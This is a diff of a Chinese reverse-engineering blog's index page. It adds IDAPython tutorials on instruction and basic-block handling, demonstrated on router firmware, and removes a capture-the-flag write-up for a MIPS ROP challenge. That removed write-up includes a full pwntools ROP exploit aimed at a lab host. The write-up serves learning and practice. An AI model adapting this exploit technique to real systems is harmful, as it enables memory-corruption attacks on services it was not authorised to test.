@@ -168,6 +168,128 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/06/IDAPython-%E5%9F%BA%E6%9C%AC%E5%9D%97%E7%B2%92%E5%BA%A6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="OneShell">
+      <meta itemprop="description" content="stay hungry, stay foolish">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OneShell">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/06/IDAPython-%E5%9F%BA%E6%9C%AC%E5%9D%97%E7%B2%92%E5%BA%A6/" class="post-title-link" itemprop="url">IDAPython-基本块粒度</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-04-06 03:43:34 / Modified: 16:46:38" itemprop="dateCreated datePublished" datetime="2023-04-06T03:43:34+08:00">2023-04-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Log/" itemprop="url" rel="index"><span itemprop="name">Log</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>指令粒度介绍完毕之后，该从基本块粒度进行说明了。所涉及到的API速查表格如下：</p>
+<table>
+<thead>
+<tr>
+<th>模块</th>
+<th>API</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>idaapi</td>
+<td>get_func(ea)</td>
+<td>获取地址ea所在函数</td>
+</tr>
+<tr>
+<td>idaapi</td>
+<td>FlowChart(f&#x3D;None, bounds&#x3D;None, flags&#x3D;0)</td>
+<td>获取函数f或者地址范围bounds的所有基本块集合</td>
+</tr>
+</tbody></table>
+<h2 id="基本块简介"><a href="#基本块简介" class="headerlink" title="基本块简介"></a>基本块简介</h2><p>先简单说一下基本块的概念，基本块（Basic Block）是一段可以被顺序执行的指令集，一般被视为程序的基本组成单元。一个程序的控制流就是由基本块组成的有向图。在一个基本块的执行过程中，它通常是由前驱基本块（predecessor）执行到当前基本块，然后当前基本块执行完毕后到后继基本块（successor）。<br>因此，大概也可以知道基本块的重要组成了：</p>
+<ol>
+<li>起始地址：基本块的第一条指令</li>
+<li>结束地址：基本块的最后一条指令</li>
+<li>指令集：基本块中所有的指令，也是要执行的指令集</li>
+<li>转移指令：用于跳转到下一个基本块</li>
+</ol>
+<p>基本块具有一个特性，那就是如果传递进行的寄存器值、使用到的内存值是一样的，那么在基本块执行完毕的寄存器集的值、内存值也是一样的。这个特性可以用于对基本块级别的仿真模拟，例如判断最后的跳转是否会被采纳。基本块在模糊测试中也被用于记录执行路径，例如AFL就是在基本块的起始地址进行了插桩，如果测试值使得基本块执行到了新的路径，那么就说明这个测试值潜力更大。<br>基本块的概念说完了，在IDA反汇编的Graph disassemble view中（空格切换，233）可以看到函数的基本块。如下就是在IDA中显示的两个基本块：<br><img src="/images/image-2023-0406-155933823.png" alt="undifined"><br>这两个基本块的作用是通过<code>strcmp</code>函数判断传入到cgibin的环境变量，选择使用哪一个接口函数来处理数据。<br>基本块1：调用phpcgi</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:00402E1C</span><br><span class="line">.text:00402E1C loc_402E1C:</span><br><span class="line">.text:00402E1C la      $t9, strcmp</span><br><span class="line">.text:00402E20 move    $a0, $s0         # s1</span><br><span class="line">.text:00402E24 sw      $a2, 0x20+var_8($sp)</span><br><span class="line">.text:00402E28 jalr    $t9 ; strcmp</span><br><span class="line">.text:00402E2C li      $a1, aPhpcgi     # &quot;phpcgi&quot;</span><br><span class="line">.text:00402E30 lw      $gp, 0x20+var_10($sp)</span><br><span class="line">.text:00402E34 lw      $a2, 0x20+var_8($sp)</span><br><span class="line">.text:00402E38 bnez    $v0, loc_402E4C</span><br><span class="line">.text:00402E3C lui     $a1, 0x42  # &#x27;B&#x27;</span><br></pre></td></tr></table></figure>
+<p>基本块2：调用dlapn.cgi</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:00402E4C</span><br><span class="line">.text:00402E4C loc_402E4C:</span><br><span class="line">.text:00402E4C la      $t9, strcmp</span><br><span class="line">.text:00402E50 move    $a0, $s0         # s1</span><br><span class="line">.text:00402E54 sw      $a2, 0x20+var_8($sp)</span><br><span class="line">.text:00402E58 jalr    $t9 ; strcmp</span><br><span class="line">.text:00402E5C li      $a1, aDlapnCgi   # &quot;dlapn.cgi&quot;</span><br><span class="line">.text:00402E60 lw      $gp, 0x20+var_10($sp)</span><br><span class="line">.text:00402E64 lw      $a2, 0x20+var_8($sp)</span><br><span class="line">.text:00402E68 bnez    $v0, loc_402E7C</span><br><span class="line">.text:00402E6C lui     $a1, 0x42  # &#x27;B&#x27;</span><br></pre></td></tr></table></figure>
+<h2 id="基本块操作"><a href="#基本块操作" class="headerlink" title="基本块操作"></a>基本块操作</h2><p>在IDAPython中，对基本块的操作通常是先根据一个指令地址得到指令所在的函数，然后获取到函数由基本块组成的控制流图，再遍历图中的所有基本块。如果要知道目标指令是在函数的哪一个基本块，遍历基本块然后判断。<br>如下的代码是遍历地址<code>ea</code>所在函数的所有基本块，然后判断<code>ea</code>在哪一个基本块。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> ida_gdl</span><br><span class="line"></span><br><span class="line">ea = <span class="number">0x00402E4C</span></span><br><span class="line">func = idaapi.get_func(ea)</span><br><span class="line">func_control_flow = idaapi.FlowChart(func, flags=idaapi.FC_PREDS)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> basic_block <span class="keyword">in</span> func_control_flow:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ID: %i, Start: 0x%x, End: 0x%x&quot;</span> % (basic_block.<span class="built_in">id</span>, basic_block.start_ea, basic_block.end_ea))</span><br><span class="line">    <span class="keyword">if</span> basic_block.start_ea &lt;= ea &lt; basic_block.end_ea:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;    ea at Here&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    succs_blocks = basic_block.succs()</span><br><span class="line">    <span class="keyword">for</span> addr <span class="keyword">in</span> succs_blocks:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;     Successor: 0x%x&quot;</span> % addr.start_ea)</span><br><span class="line">    pre_sblocks = basic_block.preds()</span><br><span class="line">    <span class="keyword">for</span> addr <span class="keyword">in</span> pre_sblocks:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;     Predecessor: 0x%x&quot;</span> % addr.end_ea)</span><br><span class="line">    <span class="keyword">if</span> ida_gdl.is_ret_block(basic_block.<span class="built_in">type</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;     Return Block&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ID: 0, Start: 0x402da0, End: 0x402e10</span></span><br><span class="line"><span class="string">     Successor: 0x402e10</span></span><br><span class="line"><span class="string">     Successor: 0x402e1c</span></span><br><span class="line"><span class="string">ID: 1, Start: 0x402e10, End: 0x402e1c</span></span><br><span class="line"><span class="string">     Successor: 0x4032e0</span></span><br><span class="line"><span class="string">     Predecessor: 0x402e10</span></span><br><span class="line"><span class="string">ID: 2, Start: 0x402e1c, End: 0x402e40</span></span><br><span class="line"><span class="string">     Successor: 0x402e40</span></span><br><span class="line"><span class="string">     Successor: 0x402e4c</span></span><br><span class="line"><span class="string">     Predecessor: 0x402e10</span></span><br><span class="line"><span class="string">ID: 3, Start: 0x402e40, End: 0x402e4c</span></span><br><span class="line"><span class="string">     Successor: 0x4032e0</span></span><br><span class="line"><span class="string">     Predecessor: 0x402e40</span></span><br><span class="line"><span class="string">ID: 4, Start: 0x402e4c, End: 0x402e70</span></span><br><span class="line"><span class="string">    ea at Here</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>我之前写过一个判断MIPS命令注入的代码，大概就是，先定位对<code>system</code>代码作为<code>ea</code>，然后获取到<code>ea</code>所在的基本块，再通过广度优先搜索得到基本块的所有前驱，直到在前驱基本块中得到所有的参数（MIPS是通过<code>a0</code>、<code>a1</code>、<code>a2</code>、<code>a3</code>寄存器进行传参），后续看能不能把代码整理出来。<br>调用<code>idaapi.FlowChart()</code>实际上是调用的<code>ida_gdl.FlowChart(f=None, bounds=None, flags=0)</code>，传参如下：</p>
+<ul>
+<li><code>f</code>：通过<code>get_func(ea)</code>获取</li>
+<li><code>bounds</code>：如果<code>f</code>参数不指定则在<code>bounds</code> tuple类型<code>(start, end)</code>范围获取基本块集合</li>
+<li><code>flags</code>：<code>FC_XXX</code>标准位，具体可以在<a target="_blank" rel="noopener" href="https://hex-rays.com/products/ida/support/idapython_docs/ida_gdl.html">此处</a>查询<br>对于每一个基本块，都有如下的一些属性：</li>
+<li><code>id</code>：基本块的ID</li>
+<li><code>start_ea</code>：基本块的起始地址</li>
+<li><code>end_ea</code>：基本块的结束地址</li>
+<li><code>type</code>：基本块类型，如下依次数值从0～7<ul>
+<li><code>fcb_normal</code>：正常的基本块</li>
+<li><code>fcb_indjump</code>：基本块以间接跳转结束</li>
+<li><code>fcb_ret</code>：返回基本块，估计是函数<code>ret</code>结束时的基本块</li>
+<li><code>fcb_cndret</code>：条件返回的基本块</li>
+<li><code>fcb_noret</code>：基本块不返回</li>
+<li><code>fcb_enoret</code>：不属于函数的基本块，且不返回</li>
+<li><code>fcb_extern</code>：外部的基本块（没有理解到含义）</li>
+<li><code>fcb_error</code>：跳过不执行的基本块（不知道是否这样）</li>
+</ul>
+</li>
+<li><code>preds()</code>：获取当前基本块的所有前驱基本块集合</li>
+<li><code>succs()</code>：获取当前基本块的所有后继基本块集合</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
     <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/06/IDAPython-%E6%8C%87%E4%BB%A4%E7%B2%92%E5%BA%A6/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -311,6 +433,81 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;ea = idc.here()</span><br><span class="line">Python&gt;idc.GetDisasm(ea)</span><br><span class="line"><span class="string">&#x27;BL              ProcUserLog&#x27;</span></span><br><span class="line">Python&gt;idc.get_operand_type(ea, <span class="number">0</span>)</span><br><span class="line"><span class="number">0x7</span></span><br><span class="line">Python&gt;idc.get_operand_value(ea, <span class="number">0</span>)</span><br><span class="line"><span class="number">0x41e2c</span></span><br></pre></td></tr></table></figure>
 <p>其中，地址0x41e2位于plt中：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.plt:00041E2C</span><br><span class="line">.plt:00041E2C</span><br><span class="line">.plt:00041E2C ; Attributes: thunk</span><br><span class="line">.plt:00041E2C</span><br><span class="line">.plt:00041E2C ProcUserLog</span><br><span class="line">.plt:00041E2C ADR             R12, 0x141E34</span><br><span class="line">.plt:00041E30 ADD             R12, R12, #0x41000</span><br><span class="line">.plt:00041E34 LDR             PC, [R12,#(ProcUserLog_ptr - 0x182E34)]! ; __imp_ProcUserLog</span><br><span class="line">.plt:00041E34 ; End of function ProcUserLog</span><br><span class="line">.plt:00041E34</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/06/idapython-%E5%9F%BA%E7%A1%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="OneShell">
+      <meta itemprop="description" content="stay hungry, stay foolish">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OneShell">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/06/idapython-%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">IDAPython-基础</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-04-06 01:18:57 / Modified: 15:40:46" itemprop="dateCreated datePublished" datetime="2023-04-06T01:18:57+08:00">2023-04-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Log/" itemprop="url" rel="index"><span itemprop="name">Log</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>我打算整理和总结一下IDAPython相关的笔记，由于使用的场景大多是在IoT领域，此处和后续的笔记采用了dir-850l固件中的cgibin（漏洞多）来作为演示。个人笔记，也不讲究通用性了，如果能被其他人作为有用参考就用叭。</p>
+<p>在学习IDAPython之初，需要了解一下IDA反汇编窗口输出的内容和结构。<br>以IDA反汇编窗口中的一条指令为例，如下的<code>sw</code>存储指令（最近在看MIPS），如下指令功能是将寄存器<code>ra</code>中的值保存到栈上：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00429000 sw      $ra, 0x418+var_s10($sp)</span><br></pre></td></tr></table></figure>
+<p>其中，<code>.text</code>是section名，也就是text节；00429000是地址，IDA中会省略掉前缀0x；<code>sw</code>是指令助记符，随后是第一个操作数<code>ra</code>和第二个操作数<code>0x418+var_s10($sp)</code>。<br>在IDAPython中，指令地址是经常被传入到API函数中进行处理的参数，API描述中使用<code>ea</code>表示，如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">idc.get_segm_name(ea)        <span class="comment"># 获取当前光标所在指令的地址</span></span><br><span class="line">idc.GetDisasm(ea)            <span class="comment"># 获取反汇编指令</span></span><br><span class="line">idc.print_insn_mnem(ea)      <span class="comment"># 打印指令助记符</span></span><br><span class="line">idc.print_operand(ea, <span class="number">0</span>)     <span class="comment"># 打印第一个操作数</span></span><br><span class="line">idc.print_operand(ea, <span class="number">1</span>)     <span class="comment"># 打印第二个操作数</span></span><br></pre></td></tr></table></figure>
+<p>IDAPython使用得比较频繁的一个操作就是获取到反汇编窗口光标所在的行的地址，可以使用<code>idc.get_screen_ea()</code>来获取，也可以直接使用<code>here()</code>获取。但如果在IDAPython脚本中不能直接使用<code>here()</code>，必须保证<code>import idc</code>，然后使用<code>idc.here()</code>。<br>对于初学者使用IDAPython最简单的方式就是在IDA最下方的命令行中直接进行操作：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;ea = idc.here()</span><br><span class="line">Python&gt;<span class="built_in">print</span>(<span class="string">&quot;0x%x, %s&quot;</span> % (ea, ea))</span><br><span class="line"><span class="number">0x40012c</span>, <span class="number">4194604</span></span><br><span class="line">Python&gt;idc.get_segm_name(ea)</span><br><span class="line"><span class="string">&#x27;.text&#x27;</span></span><br><span class="line">Python&gt;idc.GetDisasm(ea)</span><br><span class="line"><span class="string">&#x27;li      $gp, 0x492900&#x27;</span></span><br><span class="line">Python&gt;idc.print_insn_mnem(ea)</span><br><span class="line"><span class="string">&#x27;li&#x27;</span></span><br><span class="line">Python&gt;idc.print_operand(ea, <span class="number">0</span>)</span><br><span class="line"><span class="string">&#x27;$gp&#x27;</span></span><br><span class="line">Python&gt;idc.print_operand(ea, <span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;0x492900&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>对于指令的操作数的类型和值，具体还可以使用<code>idc.get_operand_type()</code>和<code>idc.get_operand_value()</code>来获得，这将在后续的笔记中进行简单说明。</p>
+
       
     </div>
 
@@ -981,176 +1178,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/03/15/callme_mipsel/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="OneShell">
-      <meta itemprop="description" content="stay hungry, stay foolish">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="OneShell">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/03/15/callme_mipsel/" class="post-title-link" itemprop="url">callme_mipsel</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-03-15 10:12:22" itemprop="dateCreated datePublished" datetime="2023-03-15T10:12:22+08:00">2023-03-15</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-04-03 13:03:33" itemprop="dateModified" datetime="2023-04-03T13:03:33+08:00">2023-04-03</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Log/" itemprop="url" rel="index"><span itemprop="name">Log</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>目的：需要构造ROP链来调用三个函数，并传入正确的参数。<br>在callme_one函数中是读取文件encrypted_flag.dat并保存到堆分配的空间g_buf中；callme_two函数读取文件key1.dat和g_buf进行逐字节异或解密；callme_three函数读取文件key2.dat继续和g_bug进行异或解密；<br>三个函数都会对传入的参数进行判定，参数符合条件再进行解密操作：</p>
-<ul>
-<li>callme_one：arg1 &#x3D;&#x3D; 0xDEADBEEF &amp;&amp; arg2 &#x3D;&#x3D; 0xCAFEBABE &amp;&amp; arg3 &#x3D;&#x3D; 0xD00DF00D</li>
-<li>callme_two：arg1 &#x3D;&#x3D; 0xDEADBEEF &amp;&amp; arg2 &#x3D;&#x3D; 0xCAFEBABE &amp;&amp; arg3 &#x3D;&#x3D; 0xD00DF00D</li>
-<li>callme_thress：arg1 &#x3D;&#x3D; 0xDEADBEEF &amp;&amp; arg2 &#x3D;&#x3D; 0xCAFEBABE &amp;&amp; arg3 &#x3D;&#x3D; 0xD00DF00D<br>在IDA中可以找到一个可用的gadget，如下 ：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:00400BB0                               usefulGadgets:</span><br><span class="line">.text:00400BB0 10 00 A4 8F                   lw      $a0, 0x10($sp)</span><br><span class="line">.text:00400BB4 0C 00 A5 8F                   lw      $a1, 0xC($sp)</span><br><span class="line">.text:00400BB8 08 00 A6 8F                   lw      $a2, 8($sp)</span><br><span class="line">.text:00400BBC 04 00 B9 8F                   lw      $t9, 4($sp)</span><br><span class="line">.text:00400BC0 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400BC4 00 00 00 00                   nop</span><br><span class="line">.text:00400BC4</span><br><span class="line">.text:00400BC8 14 00 BF 8F                   lw      $ra, 0x14($sp)</span><br><span class="line">.text:00400BCC 08 00 E0 03                   jr      $ra</span><br><span class="line">.text:00400BD0 18 00 BD 23                   addi    $sp, 0x18</span><br></pre></td></tr></table></figure>
-第一个gadget的作用是：分别从sp+0x10、sp+0xc、sp+0x8获取a0、a1、a2参数，传递给保存在sp+0x4处的函数，跳转并执行；<br>第二个gadget的作用是：跳转到sp+0x14执行，并开辟0x18大小的栈帧</li>
-</ul>
-<h2 id="ROP构造"><a href="#ROP构造" class="headerlink" title="ROP构造"></a>ROP构造</h2><p>漏洞函数依旧是pwnme，ra寄存器中的函数返回地址保存在：sp+0x3C，存在溢出的缓冲区buffer：sp+0x18，因此需要0x24个字节的数据填充到返回地址。<br>需要注意的是，当开始执行ROP，在pwnme函数中已经将堆栈指针sp进行了恢复，因此覆盖掉返回地址后，为了后期的数据布局，还需要继续覆盖4个字节，使得随后的参数可以正确布置到栈上。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 填充到栈上的返回地址</span></span><br><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x24</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 覆盖返回地址</span></span><br><span class="line">rop += usefulGadgets</span><br><span class="line"><span class="comment"># 此时SP起始地址在此处</span></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x04</span></span><br><span class="line">rop += callme_one </span><br><span class="line">rop += arg3</span><br><span class="line">rop += arg2 </span><br><span class="line">rop += arg1 </span><br><span class="line"></span><br><span class="line">rop += usefulGadgets</span><br><span class="line"><span class="comment"># 在usefulGadgets也增加了SP，因此需要填充4个字节保证数据正确布置到栈上</span></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x04</span></span><br><span class="line">rop += callme_two</span><br><span class="line">rop += arg3</span><br><span class="line">rop += arg2 </span><br><span class="line">rop += arg1 </span><br><span class="line"></span><br><span class="line">rop += usefulGadgets</span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x04</span></span><br><span class="line">rop += callme_three</span><br><span class="line">rop += arg3</span><br><span class="line">rop += arg2 </span><br><span class="line">rop += arg1 </span><br></pre></td></tr></table></figure>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">BINARY = <span class="string">&quot;./callme_mipsel&quot;</span></span><br><span class="line">ELF = ELF(BINARY)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.binary = BINARY</span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x24</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> func <span class="keyword">in</span> [<span class="string">&#x27;callme_one&#x27;</span>, <span class="string">&#x27;callme_two&#x27;</span>, <span class="string">&#x27;callme_three&#x27;</span>]:</span><br><span class="line">    rop += p32(<span class="number">0x00400BB0</span>)</span><br><span class="line">    rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span></span><br><span class="line">    rop += p32(ELF.symbols[func])</span><br><span class="line">    rop += p32(<span class="number">0xD00DF00D</span>)</span><br><span class="line">    rop += p32(<span class="number">0xCAFEBABE</span>)</span><br><span class="line">    rop += p32(<span class="number">0xDEADBEEF</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;10.0.0.2&quot;</span>, <span class="number">9999</span>)</span><br><span class="line">p.sendline(rop)</span><br><span class="line"><span class="built_in">print</span>(p.recvline_contains(<span class="string">b&quot;ROPE&quot;</span>))</span><br></pre></td></tr></table></figure>
-<p>结果如下：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python3 exp.py</span></span><br><span class="line">[*] &#x27;/home/utest/rop_practice/mipsel/callme_mipsel/callme_mipsel&#x27;</span><br><span class="line">    Arch:     mips-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RUNPATH:  b&#x27;.&#x27;</span><br><span class="line">[+] Opening connection to 10.0.0.2 on port 9999: Done</span><br><span class="line">b&#x27;ROPE&#123;a_placeholder_32byte_flag!&#125;&#x27;</span><br><span class="line">[*] Closed connection to 10.0.0.2 port 9999</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/03/15/split_mipsel/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="OneShell">
-      <meta itemprop="description" content="stay hungry, stay foolish">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="OneShell">
